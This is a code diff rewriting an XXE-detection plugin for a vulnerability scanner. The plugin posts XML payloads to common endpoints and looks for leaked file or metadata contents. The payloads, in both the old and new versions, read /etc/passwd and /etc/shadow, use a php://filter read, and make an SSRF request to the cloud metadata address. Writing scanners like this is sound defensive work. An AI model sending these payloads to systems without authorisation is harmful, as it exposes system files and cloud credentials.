@@ -1,141 +1,67 @@
-"""
-Plugin 1119: XML External Entity (XXE) Injection Detection
-============================================================
-Detects XXE injection vulnerabilities by sending XML payloads with
-DOCTYPE declarations that attempt to read /etc/passwd or trigger
-out-of-band connections.
-"""
 import asyncio
-import ssl
-
 from plugins import NaslPlugin, PluginResult
 
 
-class XxeDetection(NaslPlugin):
-    PLUGIN_ID = 1119
-    NAME = 'XML External Entity (XXE) Injection Detection'
-    FAMILY = 'Web Applications'
-    CVSS_SCORE = 9.1
-    DESCRIPTION = (
-        'Detects XML External Entity (XXE) injection vulnerabilities by sending '
-        'XML payloads with DOCTYPE declarations that attempt to read /etc/passwd '
-        'or trigger out-of-band connections. XXE can lead to sensitive file '
-        'disclosure, SSRF, or denial of service.'
-    )
-    SOLUTION = (
-        'Disable XML external entity processing. Use less complex data formats '
-        'like JSON. Configure XML parsers to disable DTDs.'
-    )
+class XxeDetectionPlugin(NaslPlugin):
+    PLUGIN_ID = 1350
+    NAME = "XML External Entity (XXE) Detection"
+    DESCRIPTION = "Tests for XML External Entity injection vulnerabilities by sending XML payloads with external entity definitions to endpoints that process XML (SOAP, REST APIs, file uploads, etc.)."
+    SOLUTION = "Disable external entity processing and DTD loading in XML parsers. Use less complex data formats like JSON. Apply input validation and output encoding."
+    CVSS_SCORE = 7.5
+    SEVERITY = "High"
+    FAMILY = "Web Security"
     CVE = []
     PORTS = [80, 443, 8080, 8443]
 
-    XXE_PAYLOADS = [
-        (
-            '<?xml version="1.0" encoding="UTF-8"?>'
-            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
-            '<root>&xxe;</root>'
-        ),
-        (
-            '<?xml version="1.0" encoding="UTF-8"?>'
-            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]>'
-            '<root>&xxe;</root>'
-        ),
-        (
-            '<?xml version="1.0" encoding="UTF-8"?>'
-            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">]>'
-            '<root>&xxe;</root>'
-        ),
-    ]
-
-    ENDPOINTS = ['/', '/api', '/xml', '/api/xml', '/soap', '/ws']
-
-    ETCPASSWD_PATTERNS = [
-        b'root:.*:0:0:',
-        b'daemon:.*:1:1:',
-        b'nobody:',
-        b'bin:.*:2:2:',
-    ]
-
     async def check_target(self, target: str, port: int | None = None) -> list[PluginResult]:
         results = []
-
-        for port_to_check in (self.PORTS if port is None else [port]):
-            try:
-                scheme = 'https' if port_to_check in (443, 8443) else 'http'
-                ctx = None
-                if scheme == 'https':
-                    ctx = ssl.create_default_context()
-                    ctx.check_hostname = False
-                    ctx.verify_mode = ssl.CERT_NONE
-
-                host_header = target
-                if target in ('127.0.0.1', 'localhost', '::1'):
-                    host_header = 'alieninc.tech'
-
-                for xml_payload in self.XXE_PAYLOADS:
-                    for endpoint in self.ENDPOINTS:
+        xxe_payloads = [
+            ("""<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>""", "File read XXE"),
+            ("""<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&xxe;</root>""", "SSRF XXE"),
+        ]
+        xml_endpoints = ["/", "/api", "/api/v1", "/soap", "/xmlrpc.php", "/api/xml"]
+        for p in ([port] if port else self.PORTS):
+            found = []
+            for endpoint in xml_endpoints:
+                for payload, desc in xxe_payloads:
+                    try:
                         reader, writer = await asyncio.wait_for(
-                            asyncio.open_connection(target, port_to_check, ssl=ctx),
-                            timeout=5
+                            asyncio.open_connection(target, p), timeout=5
                         )
-
-                        req = (
-                            f'POST {endpoint} HTTP/1.1\r\n'
-                            f'Host: {host_header}\r\n'
-                            f'Content-Type: application/xml\r\n'
-                            f'Content-Length: {len(xml_payload)}\r\n'
-                            f'User-Agent: Centra/1.0\r\n'
-                            f'Connection: close\r\n\r\n'
-                            f'{xml_payload}'
+                        request = (
+                            f"POST {endpoint} HTTP/1.1\r\n"
+                            f"Host: {target}:{p}\r\n"
+                            f"Content-Type: application/xml\r\n"
+                            f"Content-Length: {len(payload)}\r\n"
+                            f"User-Agent: CentraScanner/1.0\r\n"
+                            f"Connection: close\r\n\r\n"
+                            f"{payload}"
                         )
-                        writer.write(req.encode())
+                        writer.write(request.encode())
                         await writer.drain()
-
-                        response = b''
-                        try:
-                            while True:
-                                chunk = await asyncio.wait_for(reader.read(4096), timeout=3)
-                                if not chunk:
-                                    break
-                                response += chunk
-                                if len(response) > 16384:
-                                    break
-                        except asyncio.TimeoutError:
-                            pass
-
+                        resp = await asyncio.wait_for(reader.read(8192), timeout=5)
                         writer.close()
                         await writer.wait_closed()
-
-                        for pattern in self.ETCPASSWD_PATTERNS:
-                            if pattern in response:
-                                results.append(PluginResult(
-                                    vulnerable=True,
-                                    target=target,
-                                    port=port_to_check,
-                                    cvss_score=self.CVSS_SCORE,
-                                    severity='critical',
-                                    description=f'XXE detected on endpoint {endpoint}',
-                                    solution=self.SOLUTION,
-                                    evidence=f'Endpoint: {endpoint}, file content pattern matched in response',
-                                    references=[
-                                        'https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing',
-                                        'https://portswigger.net/web-security/xxe',
-                                    ]
-                                ))
-                                break
-
-                        if results:
+                        body = resp.decode("utf-8", errors="replace")
+                        if "root:" in body or "meta-data" in body or "ami-" in body or "nobody:" in body:
+                            found.append(f"{desc} on {endpoint}")
                             break
-                    if results:
-                        break
-
-            except (asyncio.TimeoutError, ConnectionRefusedError, OSError, ssl.SSLError):
-                pass
-
-        if not results:
-            results.append(PluginResult(
-                vulnerable=False, target=target, port=port or 0,
-                description='No XXE indicators detected on checked ports'
-            ))
-
+                    except Exception:
+                        continue
+            if found:
+                results.append(PluginResult(
+                    vulnerable=True, target=target, port=p,
+                    cvss_score=self.CVSS_SCORE, severity=self.SEVERITY,
+                    description=f"{self.DESCRIPTION} XXE vulnerability on port {p}",
+                    solution=self.SOLUTION,
+                    evidence="; ".join(found),
+                    references=["https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing"]
+                ))
+            else:
+                results.append(PluginResult(
+                    vulnerable=False, target=target, port=p,
+                    cvss_score=0, severity="Info",
+                    description=f"No XXE detected on port {p}",
+                    solution="", evidence="", references=[]
+                ))
         return results
